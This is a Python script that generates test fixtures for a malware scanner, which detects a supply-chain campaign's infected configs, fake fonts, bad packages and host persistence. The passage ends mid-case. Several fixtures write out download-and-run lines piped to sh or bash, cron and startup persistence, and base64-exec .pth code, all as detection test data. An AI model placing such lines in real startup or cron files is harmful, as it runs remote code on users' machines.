#!/usr/bin/env python3
"""Generate conformance/cases/*.json.

The cases are generated rather than hand-written so the set stays internally
consistent: one place defines what a fixture looks like, and a reviewer reads
intent rather than JSON punctuation.

No case contains a payload. Fixtures write {{STRONG}}, {{WEAK}}, {{BADPKG}}
and {{PAD}}, and conformance/run.sh substitutes real values from ioc/ when it
builds the tree. Working malware strings stay out of the repository, and the
corpus cannot drift away from the indicator set it is testing.

{{STRONG_U}} is the same strong indicator with every character written as a
\\uXXXX escape, the way the 0xa322 loader family writes its strings
(ADR-0040). It is built from ioc/ too, so no escaped payload is committed
either.

Host cases describe a machine as well as a tree. They add {{IMPLANT}} (an
implant process name), {{IMPLANT_CUT}} (the same name as the Linux kernel
reports it, 15 bytes) and {{NETIP}} (a campaign address), a `home` map written
under the fixture's home directory, and a `host` map holding the machine's
state as files. See host_state() below.
"""
import json
import os

D = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cases")
os.makedirs(D, exist_ok=True)

# A real font starts with the four ASCII bytes wOF2. That is all the check
# reads, so the fixture needs nothing else to be a valid font for our purposes.
REAL_FONT = "wOF2 followed by bytes that are not checked\n"
FAKE_FONT = "var _0x4a=function(){return 1};\n"

CASES = {}


def case(name, **kw):
    CASES[name] = kw


case(
    "clean-tree",
    why="A clean project reports clean and exits 0.",
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": "export default { plugins: {} }\n",
        "code/proj/package.json": '{"name":"proj","dependencies":{"react":"^18.0.0"}}\n',
        "code/proj/public/real.woff2": REAL_FONT,
        "code/proj/src/index.js": "export const hello = () => 'world'\n",
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "build config files checked"}],
        "must_not_report": ["[HIT]"],
    },
)

case(
    "config-payload-after-module-end",
    why="The canonical infection: payload appended past the module end, behind padding.",
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": "export default { plugins: {} }\n{{PAD}}{{STRONG}}\n",
        "code/proj/src/index.js": "export const hello = () => 'world'\n",
    },
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "postcss.config.mjs",
        }],
        "must_not_report": ["src/index.js"],
    },
)

case(
    "font-masquerade",
    why="A .woff2 whose bytes are JavaScript is a payload, not a font.",
    roots=["code"],
    files={
        "code/proj/public/fake.woff2": FAKE_FONT,
        "code/proj/public/real.woff2": REAL_FONT,
    },
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "font file is not a font", "path": "fake.woff2"}],
        "must_not_report": ["real.woff2"],
    },
)

case(
    "a-file-named-as-an-indicator-is-found-on-disk",
    why="ioc/filenames.txt names files that are indicators by name alone. 1.x "
        "matched them in a path scan, and a GitHub scan still does, so a check "
        "of a folder must too. The near miss has two digits where the pattern "
        "counts three.",
    roots=["code"],
    files={
        "code/proj/public/fa-solid-900.llf": "not a font\n",
        "code/proj/public/fa-solid-90.llf": "not a font\n",
    },
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "file named as an indicator",
                      "path": "fa-solid-900.llf"}],
        "must_not_report": ["fa-solid-90.llf"],
    },
)

case(
    "lfs-pointer-is-not-a-fake-font",
    why="Git LFS stores a text pointer in place of the font. Flagging it is a "
        "known false positive and must stay fixed.",
    roots=["code"],
    files={
        "code/proj/public/tracked.woff2":
            "version https://git-lfs.github.com/spec/v1\noid sha256:abc123\nsize 1234\n",
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "font files checked"}],
        "must_not_report": ["tracked.woff2"],
    },
)

case(
    "tasks-json-runs-on-folder-open",
    why="A task that runs on folder open needs a human, but is not on its own "
        "a confirmed infection.",
    roots=["code"],
    files={
        "code/proj/.vscode/tasks.json":
            '{"version":"2.0.0","tasks":[{"label":"setup","type":"shell",'
            '"command":"npm ci","runOptions":{"runOn":"folderOpen"}}]}\n',
    },
    expect={
        "exit": 1,
        "findings": [{"level": "review", "match": "runs on folder open", "path": "tasks.json"}],
        "must_not_report": ["[HIT]"],
    },
)

case(
    "tasks-json-folder-open-and-infected",
    why="The same task carrying an indicator is confirmed, not review.",
    roots=["code"],
    files={
        "code/proj/.vscode/tasks.json":
            '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"{{STRONG}}"}]}\n',
    },
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "runs on folder open AND contains an indicator",
            "path": "tasks.json",
        }],
    },
)

case(
    "settings-json-is-not-tasks-json",
    why="Only .vscode/tasks.json executes commands. Matching folderOpen in "
        "settings.json is a known false positive.",
    roots=["code"],
    files={
        "code/proj/.vscode/settings.json": '{"workbench.editor.labelFormat":"folderOpen"}\n',
    },
    expect={"exit": 0, "must_not_report": ["settings.json"]},
)

case(
    "known-bad-package-in-lockfile",
    why="A campaign package named in a manifest is confirmed even though "
        "node_modules itself is never walked.",
    roots=["code"],
    files={
        "code/proj/package.json": '{"name":"proj","dependencies":{"{{BADPKG}}":"^1.0.0"}}\n',
    },
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "known-bad package referenced",
            "path": "package.json",
        }],
    },
)

case(
    "known-bad-package-in-every-lockfile-format",
    why="A lockfile is where a campaign package sits when it came in as a "
        "dependency of a dependency, so package.json alone would miss it. "
        "Each of the four formats names its packages its own way, and each "
        "is read for its names (ADR-0041): an npm v3 lockfile by its "
        "node_modules paths, a yarn lockfile by its entry headers and a pnpm "
        "lockfile by its package keys.",
    roots=["code"],
    files={
        "code/npm/package.json": '{"name":"npm-proj","dependencies":{"react":"^18.0.0"}}\n',
        "code/npm/package-lock.json":
            '{"name":"npm-proj","lockfileVersion":3,"packages":{'
            '"":{"name":"npm-proj","dependencies":{"react":"^18.0.0"}},'
            '"node_modules/react":{"version":"18.2.0"},'
            '"node_modules/react/node_modules/{{BADPKG}}":{"version":"1.0.0"}}}\n',
        "code/yarn/yarn.lock":
            "# yarn lockfile v1\n\n\nreact@^18.0.0:\n  version \"18.2.0\"\n"
            "  dependencies:\n    {{BADPKG}} \"^1.0.0\"\n\n"
            "{{BADPKG}}@^1.0.0:\n  version \"1.0.0\"\n",
        "code/pnpm/pnpm-lock.yaml":
            "lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n"
            "      react:\n        specifier: ^18.0.0\n        version: 18.2.0\n\n"
            "packages:\n\n  react@18.2.0:\n    resolution: {integrity: sha512-x}\n\n"
            "  {{BADPKG}}@1.0.0:\n    resolution: {integrity: sha512-y}\n",
    },
    expect={
        "exit": 2,
        "findings": [
            {"level": "HIT", "match": "known-bad package referenced", "path": "package-lock.json"},
            {"level": "HIT", "match": "known-bad package referenced", "path": "yarn.lock"},
            {"level": "HIT", "match": "known-bad package referenced", "path": "pnpm-lock.yaml"},
        ],
        "must_not_report": ["npm/package.json", "could not be read as a manifest"],
    },
)

case(
    "bad-package-name-inside-a-longer-name-is-not-a-dependency",
    why="Three campaign names were turned away on 2026-09-14 and five more "
        "on 2026-10-05 because each is the start of a real, maintained "
        "package (sass-format and sass-formatter), and a fixed-string match "
        "would report every project using the real one as infected. A "
        "dependency is its whole name. A project depending on a longer "
        "package that merely begins with a campaign name depends on "
        "something else, and saying INFECTED to it is the false positive "
        "this repository ranks worst.",
    roots=["code"],
    files={
        "code/proj/package.json":
            '{"name":"proj","dependencies":{"{{BADPKG}}-utils":"^2.0.0",'
            '"react":"^18.0.0"}}\n',
        "code/proj/yarn.lock":
            "# yarn lockfile v1\n\n\n\"{{BADPKG}}-utils@^2.0.0\":\n  version \"2.0.0\"\n",
        "code/proj/pnpm-lock.yaml":
            "lockfileVersion: '9.0'\n\npackages:\n\n  '{{BADPKG}}-utils@2.0.0':\n"
            "    resolution: {integrity: sha512-x}\n",
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "no known-bad package names in manifests"}],
        "must_not_report": ["[HIT]", "package.json", "yarn.lock", "pnpm-lock.yaml"],
    },
)

case(
    "bad-package-name-in-a-description-is-not-a-dependency",
    why="A package that replaces, wraps or warns about a campaign package "
        "says so in its description and keywords. Text is not a dependency: "
        "nothing in a description is installed, so a project carrying one is "
        "clean. 1.x matched the whole file and called it infected.",
    roots=["code"],
    files={
        "code/proj/package.json":
            '{"name":"proj","description":"A safe replacement for {{BADPKG}}",'
            '"keywords":["{{BADPKG}}"],"dependencies":{"react":"^18.0.0"}}\n',
    },
    expect={
        "exit": 0,
        "must_not_report": ["[HIT]", "package.json"],
    },
)

case(
    "unreadable-manifest-is-review-not-clean",
    why="A manifest the reader cannot parse, here with a trailing comma npm "
        "itself would refuse, is a file nobody can vouch for. Calling it "
        "clean would be saying nothing is installed from a file that was "
        "never understood, so it is a review line. It names no campaign "
        "package, so it is not a confirmed one.",
    roots=["code"],
    files={
        "code/plain/package.json": '{"name":"plain", "dependencies": {"react": "^18.0.0",}\n',
    },
    expect={
        "exit": 1,
        "findings": [
            {"level": "review", "match": "could not be read as a manifest, so package names were matched as text",
             "path": "plain/package.json"},
        ],
        "must_not_report": ["[HIT]"],
    },
)

case(
    "unreadable-manifest-naming-a-campaign-package-is-still-confirmed",
    why="A lockfile left with merge conflict markers cannot be parsed, and "
        "is one the package manager reads again the moment someone resolves "
        "it. Its text is matched as 1.x matched it, so a campaign name in it "
        "is still confirmed: a reader that gave up must not turn a finding "
        "1.x made into a clean result. A review line says the confirmation "
        "came from the text.",
    roots=["code"],
    files={
        "code/named/package-lock.json":
            '{"name":"named","lockfileVersion":3,"packages":{\n'
            '<<<<<<< HEAD\n"node_modules/{{BADPKG}}":{"version":"1.0.0"}\n=======\n'
            '"node_modules/react":{"version":"18.2.0"}\n>>>>>>> theirs\n}}\n',
    },
    expect={
        "exit": 2,
        "findings": [
            {"level": "HIT", "match": "known-bad package referenced", "path": "named/package-lock.json"},
            {"level": "review", "match": "could not be read as a manifest, so package names were matched as text",
             "path": "named/package-lock.json"},
        ],
    },
)

case(
    "python-startup-files-packaging-tools-write-are-clean",
    why="Most Python environments hold several .pth files, and nearly all "
        "of them run code: virtualenv's, setuptools' distutils shim, an "
        "editable install's finder, a namespace package's long one-liner, "
        "pytest-cov's exec. Reporting any of them would put a review line on "
        "every Python developer's machine. A project's .venv is read even "
        "though the walk never enters it. And a .pth outside site-packages "
        "is not run by anything; PyTorch saves models with the extension, "
        "so it is not even read.",
    roots=["code"],
    files={
        "code/proj/.venv/lib/python3.12/site-packages/_virtualenv.pth": "import _virtualenv\n",
        "code/proj/.venv/lib/python3.12/site-packages/distutils-precedence.pth":
            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
            "enabled and __import__('_distutils_hack').add_shim(); \n",
        "code/proj/.venv/lib/python3.12/site-packages/__editable__.proj-0.1.0.pth":
            "import __editable___proj_0_1_0_finder; __editable___proj_0_1_0_finder.install()\n",
        "code/proj/.venv/lib/python3.12/site-packages/google_auth-2.0.0-py3.12-nspkg.pth":
            "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
            "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));"
            "importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');"
            "m = has_mfs and sys.modules.setdefault('google', importlib.util.module_from_spec("
            "importlib.machinery.PathFinder.find_spec('google', [os.path.dirname(p)])));"
            "m = m or sys.modules.setdefault('google', types.ModuleType('google'));"
            "mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n",
        "code/proj/.venv/lib/python3.12/site-packages/pytest-cov.pth":
            "import os, sys;exec('if \\'COV_CORE_SOURCE\\' in os.environ:\\n  try:\\n"
            "    from pytest_cov.embed import init\\n    init()\\n  except Exception as exc:\\n"
            "    sys.stderr.write(\"pytest-cov: Failed to setup subprocess coverage.\")\\n')\n",
        "code/proj/.venv/lib/python3.12/site-packages/proj.pth": "/home/dev/code/proj/src\n",
        "code/proj/models/weights.pth": "import os;os.system('curl http://example.invalid | sh')\n",
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "6 Python startup files (.pth) checked, none runs anything unusual"}],
        "must_not_report": ["[HIT]", "[review]"],
    },
)

case(
    "node-modules-is-not-scanned",
    why="ADR-0004 and ADR-0025: node_modules is pruned, so a payload living "
        "only there is invisible to the content scan. This case exists to make "
        "that limitation explicit and deliberate, not to assert it is desirable.",
    roots=["code"],
    files={
        "code/proj/node_modules/evil/postcss.config.mjs":
            "export default {}\n{{PAD}}{{STRONG}}\n",
        "code/proj/node_modules/evil/public/fake.woff2": FAKE_FONT,
        "code/proj/postcss.config.mjs": "export default { plugins: {} }\n",
    },
    expect={"exit": 0, "must_not_report": ["node_modules", "[HIT]"]},
)

case(
    "payload-in-an-ordinary-source-file-is-not-found",
    why="The machine check is targeted by filename, not a general content grep. "
        "A payload in an arbitrary .js is out of scope here and is caught by the "
        "repository scan instead. Recorded so the port does not silently change "
        "the contract in either direction.",
    roots=["code"],
    files={
        "code/proj/src/vendor.js": "{{PAD}}{{STRONG}}\n",
        "code/proj/postcss.config.mjs": "export default { plugins: {} }\n",
    },
    expect={"exit": 0, "must_not_report": ["[HIT]"]},
)

case(
    "dry-run-changes-nothing",
    why="The single most important property: a default run is read-only, even "
        "on a tree full of confirmed hits.",
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": "export default {}\n{{PAD}}{{STRONG}}\n",
        "code/proj/public/fake.woff2": FAKE_FONT,
        "code/proj/.vscode/tasks.json":
            '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"{{STRONG}}"}]}\n',
    },
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{"level": "HIT", "match": "font file is not a font"}],
        "must_not_report": ["quarantined ->"],
    },
)

case(
    "apply-quarantines-and-never-deletes",
    why="--apply moves confirmed artifacts into quarantine with a manifest. "
        "Nothing is ever deleted.",
    roots=["code"],
    apply=True,
    files={
        "code/proj/public/fake.woff2": FAKE_FONT,
        "code/proj/src/index.js": "export const hello = () => 'world'\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "quarantined": ["code/proj/public/fake.woff2"],
        "findings": [{"level": "HIT", "match": "font file is not a font"}],
        "must_not_report": ["src/index.js"],
    },
)


# ---------------------------------------------------------------------------
# Host cases. The machine, as data.
#
# These run without --fs-only and with --host-state. The state directory holds
# one file per question the scanner asks of a machine. A file that is ABSENT
# means the question was not answered, and the scan must say so; an empty file
# is the empty answer. That distinction is what most of these cases are about.
# ---------------------------------------------------------------------------

# Every host case scans the same unremarkable tree, so anything it reports
# comes from the machine and not from the files.
ORDINARY_TREE = {"code/proj/src/index.js": "export const hello = () => 'world'\n"}


def host_state(platform="linux", files=None, **answers):
    """A quiet machine: nothing running, nothing scheduled, nothing configured.

    Keyword arguments replace one answer (processes, connections, crontab,
    git_config). Pass None to leave a question unanswered, which is not the
    same as answering it with nothing. `files` adds entries by their path in
    the state directory, for system files under root/ and for `.absent`
    markers.
    """
    state = {
        "platform": platform + "\n",
        "processes": "",
        "connections": "",
        "crontab": "",
        "git-config": "",
        # root/ stands in for / when system directories are read.
        "root/.keep": "",
    }
    for key, value in answers.items():
        state[key.replace("_", "-")] = value
    state.update(files or {})
    return {k: v for k, v in state.items() if v is not None}


def host_case(name, why, expect, host=None, home=None, **kw):
    case(
        name,
        why=why,
        roots=["code"],
        files=ORDINARY_TREE,
        home=home or {},
        host=host if host is not None else host_state(),
        expect=expect,
        **kw,
    )


NOTHING_FOUND = ["[HIT]", "[review]"]

host_case(
    "host-quiet-machine-is-clean",
    why="A machine with nothing running, scheduled or configured is clean, and "
        "every host section says it looked. If this fails, a host check is "
        "making a finding out of nothing and every other host case is noise.",
    expect={
        "exit": 0,
        "findings": [
            {"level": "ok", "match": "no second-stage implant found"},
            {"level": "ok", "match": "user crontab is empty"},
            {"level": "ok", "match": "no global core.hooksPath"},
            {"level": "ok", "match": "no interpreter running inline code"},
            {"level": "ok", "match": "no established node or Electron TCP connections"},
        ],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-nothing-supplied-is-not-clean",
    why="The failure this whole boundary exists to prevent: a question that "
        "was never answered read as an empty answer. A state directory that "
        "only names a platform must produce a review item per unanswered "
        "question and must not exit 0.",
    host={"platform": "linux\n"},
    expect={
        "exit": 1,
        "findings": [
            {"level": "review", "match": "could not read the process table, so a running implant was not looked for"},
            {"level": "review", "match": "could not read the process table, so resident interpreters were not checked"},
            {"level": "review", "match": "system-wide persistence was not checked"},
            {"level": "review", "match": "could not read the user crontab"},
            {"level": "review", "match": "could not read the global git configuration"},
            {"level": "review", "match": "could not list connections"},
        ],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-implant-process-running",
    why="The implant sets its own process title, so the process table is a "
        "finding with nothing on disk. macOS reports the executable's full "
        "path, spaces included, and the name is its last component.",
    host=host_state(
        "macos",
        processes="1\t/sbin/launchd\t/sbin/launchd\n"
                  "4242\t/Users/x/Library/Application Support/{{IMPLANT}}\t"
                  "/Users/x/Library/Application Support/{{IMPLANT}}\n",
    ),
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "an implant process is running now"}],
    },
)

host_case(
    "host-implant-name-cut-by-the-linux-kernel",
    why="Linux keeps 15 bytes of a process name. The implant's is longer, so "
        "ps shows it cut short and a whole-name comparison never matches. "
        "Observed in the sandbox, not assumed: a binary run under the full "
        "name appears as the first 15 bytes. The shell check compares whole "
        "names and has therefore never matched on Linux. A name of exactly "
        "15 bytes that begins a longer implant name is that implant.",
    host=host_state(
        "linux",
        processes="1\tsystemd\t/sbin/init\n"
                  "4242\t{{IMPLANT_CUT}}\t/home/x/.local/share/{{IMPLANT}}\n",
    ),
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "an implant process is running now"}],
    },
)

host_case(
    "host-mentioning-the-implant-is-not-running-it",
    why="The process NAME is compared, never the command line. An "
        "administrator grepping for the implant, or an editor with a file "
        "named after it, mentions it without being it. Matching the command "
        "line once reported the operator's own shell as the implant.",
    host=host_state(
        "linux",
        processes="10\tgrep\tgrep -r {{IMPLANT}} /home/x\n"
                  "11\tvim\tvim notes-about-{{IMPLANT}}.txt\n",
    ),
    expect={"exit": 0, "must_not_report": NOTHING_FOUND},
)

host_case(
    "host-systemd-unit-with-indicator",
    why="A user unit carrying an indicator is confirmed persistence. The run "
        "is a dry run, so the unit must still be where it was afterwards: the "
        "home directory is part of what a read-only scan leaves alone.",
    home={
        ".config/systemd/user/updater.service":
            "[Service]\nExecStart=/bin/sh -c '{{STRONG}}'\n",
        ".config/systemd/user/backup.timer": "[Timer]\nOnCalendar=daily\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "systemd unit contains an indicator",
            "path": "updater.service",
        }],
        "must_not_report": ["backup.timer", "quarantined ->"],
        # A login item is outside the projects: the payload ran here, and the
        # next steps must say rebuild and give the command that contains it.
        "must_print": ["WHAT TO DO NEXT", "The payload ran on this machine",
                       "polinrider check --apply", "Rebuild this machine from a clean install"],
    },
)

host_case(
    "host-apply-quarantines-a-launch-item",
    why="--apply moves a confirmed launch item out of the home directory and "
        "into quarantine with a manifest. Moved, never deleted, the same "
        "promise the filesystem checks make.",
    apply=True,
    host=host_state("macos"),
    home={
        "Library/LaunchAgents/com.example.updater.plist":
            "<plist><dict><key>ProgramArguments</key>"
            "<array><string>{{STRONG}}</string></array></dict></plist>\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "home_quarantined": ["Library/LaunchAgents/com.example.updater.plist"],
        "findings": [{
            "level": "HIT",
            "match": "launch item contains an indicator",
            "path": "com.example.updater.plist",
        }],
    },
)

host_case(
    "host-system-cron-entry-with-indicator",
    why="System-wide persistence is read through the same boundary as the "
        "process table: root/ stands in for /. A cron.d entry carrying an "
        "indicator is confirmed.",
    host=host_state(
        "linux",
        files={"root/etc/cron.d/sysupdate": "*/10 * * * * root /bin/sh -c '{{STRONG}}'\n"},
    ),
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "system cron entry contains an indicator",
            "path": "sysupdate",
        }],
    },
)

host_case(
    "host-user-crontab-is-review",
    why="An ordinary crontab is not evidence of anything, and it is also "
        "exactly where persistence goes. A human reads it: review, not a hit, "
        "and not silence.",
    host=host_state(crontab="0 3 * * * /usr/local/bin/backup\n"),
    expect={
        "exit": 1,
        "findings": [{"level": "review", "match": "user crontab is not empty"}],
        "must_not_report": ["[HIT]"],
        "must_print": ["WHAT TO DO NEXT", "Nothing is confirmed"],
        "must_not_print": ["Rebuild this machine"],
    },
)

host_case(
    "host-user-crontab-naming-the-controller",
    why="A crontab line that calls a campaign address has no innocent "
        "reading. The shell left every non-empty crontab at review while "
        "calling the same content in a cron.d file or a unit a hit; this is "
        "that inconsistency settled in favour of the hit.",
    host=host_state(crontab="*/5 * * * * curl -s http://{{NETIP}}/u | sh\n"),
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "user crontab contains an indicator"}],
    },
)

host_case(
    "host-no-crontab-command-is-its-own-answer",
    why="A machine without a crontab command has no user crontab to run, "
        "which is a different statement from 'it was empty' and from 'it "
        "could not be read'. It is not a review item, or every container and "
        "minimal install would exit 1.",
    host=host_state(crontab=None, files={"crontab.absent": ""}),
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "no crontab command on this machine"}],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-shell-startup-pipes-a-download",
    why="A startup file that pipes a download into a shell runs somebody "
        "else's code at every login. Nobody writes that line by accident.",
    home={".bashrc": "export PATH=$HOME/bin:$PATH\ncurl -fsSL http://example.invalid/i.sh | bash\n"},
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "shell startup file pipes a download into an interpreter",
            "path": ".bashrc",
        }],
    },
)

host_case(
    "host-shell-startup-checksum-and-comment-are-clean",
    why="A false COMPROMISED is worse than a missed review. The shell's "
        "pattern ended at 'sh' without asking what followed, so piping a "
        "download into shasum, which is how a careful person verifies one, "
        "matched as piping into sh. A commented-out install line runs nothing. "
        "Both must stay clean.",
    home={
        ".zshrc":
            "alias verify='curl -sL http://example.invalid/f | shasum -a 256'\n"
            "# curl -fsSL http://example.invalid/install.sh | bash\n",
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "clean:", "path": ".zshrc"}],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-private-npm-registry-is-review-not-compromise",
    why="The shell called any registry other than npmjs.org a confirmed hit, "
        "which tells every company with an internal registry that the machine "
        "must be rebuilt. It is worth a human confirming the registry is "
        "theirs; it is not evidence of this campaign.",
    home={".npmrc": "registry=https://npm.corp.example/\n"},
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "a non-default npm registry is configured",
            "path": "npm.corp.example",
        }],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-npm-token-is-redacted",
    why="The scan reads ~/.npmrc and prints it. A token it read must not be a "
        "token it wrote into a report that gets attached to a ticket. Owning "
        "a token is inventory, not a finding.",
    home={".npmrc": "//registry.npmjs.org/:_authToken=npm_NOTAREALTOKEN0000000000\n"},
    expect={
        "exit": 0,
        "findings": [{"level": "info", "match": "an npm auth token is stored on disk"}],
        "must_not_report": NOTHING_FOUND,
        "must_not_print": ["npm_NOTAREALTOKEN0000000000"],
    },
)

# npm's lib/cli.js as npm 10 ships it: four lines, a few hundred bytes.
NPM_CLI = (
    "const validateEngines = require('./cli/validate-engines.js')\n"
    "const cliEntry = require('node:path').resolve(__dirname, 'cli/entry.js')\n\n"
    "module.exports = (process) =>\n"
    "  validateEngines(process, () => require(cliEntry))\n"
)
NPM_SHIM = "#!/usr/bin/env node\nrequire('../lib/cli.js')(process)\n"

host_case(
    "host-npm-program-file-with-indicator-is-confirmed",
    why="The 2026-09-14 review: npm's lib/cli.js is replaced with a copy that "
        "carries the payload, so every npm and npx command starts it again "
        "and it survives every other step of a cleanup. An indicator in a "
        "file npm runs before anything else has no innocent reading. It is "
        "read through the host's system root like every other system path, "
        "and the advice is to reinstall Node.js, because quarantining the "
        "file leaves npm unable to run.",
    host=host_state(files={
        "root/usr/local/lib/node_modules/npm/lib/cli.js": NPM_CLI + "{{PAD}}{{STRONG}}\n",
        "root/usr/local/lib/node_modules/npm/bin/npm-cli.js": NPM_SHIM,
    }),
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "npm's own program file contains an indicator",
            "path": "node_modules/npm/lib/cli.js",
        }],
        "must_print": ["Reinstall Node.js"],
        "must_not_report": ["npm-cli.js"],
    },
)

host_case(
    "host-npm-program-file-padded-without-indicator-is-review",
    why="The campaign rotates its markers, and the shape of this change does "
        "not rotate with them: npm's entry file with code after a long run "
        "of blank space is not how npm ships it. Without an indicator it is "
        "not confirmed, and it is also not something to leave unread. Found "
        "under a version manager in the home directory, where most "
        "developers' npm lives.",
    home={".nvm/versions/node/v20.11.0/lib/node_modules/npm/lib/cli.js":
          NPM_CLI + "{{PAD}}require('child_process').spawn('node', ['-e', 'x'])\n"},
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "npm's own program file looks altered (code after a long run of blank space)",
            "path": "v20.11.0/lib/node_modules/npm/lib/cli.js",
        }],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-npm-program-files-as-shipped-are-clean",
    why="npm installed for every user and npm installed by a version "
        "manager, both as npm ships them. Nothing to report, and the section "
        "says how many installations it looked at, so finding none is never "
        "mistaken for not looking.",
    host=host_state(files={
        "root/usr/lib/node_modules/npm/lib/cli.js": NPM_CLI,
        "root/usr/lib/node_modules/npm/bin/npm-cli.js": NPM_SHIM,
    }),
    home={".volta/tools/image/node/20.11.0/lib/node_modules/npm/lib/cli.js": NPM_CLI},
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "2 npm installations checked"}],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-npmrc-onload-script-is-review",
    why="onload-script makes npm load a script every time it starts, which "
        "is the npm CLI persisting without any of npm's files changing. It "
        "has legitimate uses, so without an indicator it is review. A "
        "node-options line that only sizes the heap loads nothing and is not "
        "listed.",
    home={".npmrc": "onload-script=/home/dev/.config/npm/hook.js\n"
                    "node-options=--max-old-space-size=4096\n"},
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "~/.npmrc runs a script whenever npm starts (onload-script)",
            "path": "hook.js",
        }],
        "must_not_report": ["[HIT]", "node-options"],
    },
)

host_case(
    "host-npmrc-node-options-preloading-an-indicator-is-confirmed",
    why="node-options with --require loads a module into every script npm "
        "runs. One whose value carries an indicator is the payload starting "
        "with every install, and is confirmed.",
    home={".npmrc": "node-options=--require /home/dev/.cache/{{STRONG}}.js\n"},
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "~/.npmrc loads code into every script npm runs, and it contains an indicator (node-options)",
        }],
    },
)

host_case(
    "host-python-startup-file-with-indicator-is-confirmed",
    why="Python executes every line of a .pth file in site-packages that "
        "begins with import, each time any Python starts. That is how the "
        "pybitjs package re-runs itself (the 2026-10-05 review), and it is "
        "quieter than anything on the Node side. One carrying an indicator "
        "in this user's own site-packages is confirmed and can be "
        "quarantined: Python skips a .pth that is not there.",
    home={".local/lib/python3.12/site-packages/zz_helper.pth":
          "import os;exec('{{STRONG}}')\n"},
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "Python startup file contains an indicator",
            "path": "site-packages/zz_helper.pth",
        }],
    },
)

host_case(
    "host-python-startup-file-that-decodes-and-runs-is-review",
    why="A .pth line that decodes base64 and executes it is not something a "
        "packaging tool writes, and it is how a stager hides. Without an "
        "indicator it is not confirmed, so it is review. It sits in Python "
        "installed for every user, read through the host's system root, so "
        "the corpus can supply it as a file.",
    host=host_state(files={
        "root/usr/lib/python3.12/site-packages/sitecheck.pth":
            "import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n",
    }),
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "Python startup file runs code that packages do not usually put there",
            "path": "sitecheck.pth",
        }],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-inline-interpreter-is-review",
    why="node -e and python -c are how the first stage runs, and also how "
        "editors and coding agents run things all day. Review, with the "
        "command line shown. A node process running a file is ordinary and "
        "is not listed.",
    host=host_state(
        processes="50\tnode\tnode /srv/app/server.js\n"
                  "51\tnode\tnode -e console.log(1)\n",
    ),
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "an interpreter is running code passed on the command line",
        }],
        "must_not_report": ["[HIT]", "server.js"],
    },
)

host_case(
    "host-connection-to-campaign-from-any-process",
    why="The shell looked only at sockets held by node and Electron. The "
        "second stage is a native binary under its own name, so its "
        "connection to the controller was never examined. A live connection "
        "to a campaign address is confirmed whatever holds it.",
    host=host_state(
        connections='ESTAB 0 0 10.0.0.2:40000 198.51.100.4:443 users:(("node",pid=9,fd=20))\n'
                    'ESTAB 0 0 10.0.0.2:40001 {{NETIP}}:443 users:(("updater",pid=8,fd=3))\n',
    ),
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "live connection to known campaign infrastructure",
        }],
    },
)

host_case(
    "host-address-containing-a-campaign-address-is-not-a-hit",
    why="A fixed-string match for an address also matches every address that "
        "contains it: one more digit on the end, or one more on the front, is "
        "somebody else's server. The fixture address need not be a valid one; "
        "what it tests is that the match ends where the address ends. A "
        "connection to a neighbour must not report the machine compromised.",
    host=host_state(
        connections='ESTAB 0 0 10.0.0.2:40001 {{NETIP}}9:443 users:(("node",pid=8,fd=3))\n'
                    'ESTAB 0 0 10.0.0.2:40002 1{{NETIP}}:443 users:(("node",pid=8,fd=4))\n',
    ),
    expect={
        "exit": 0,
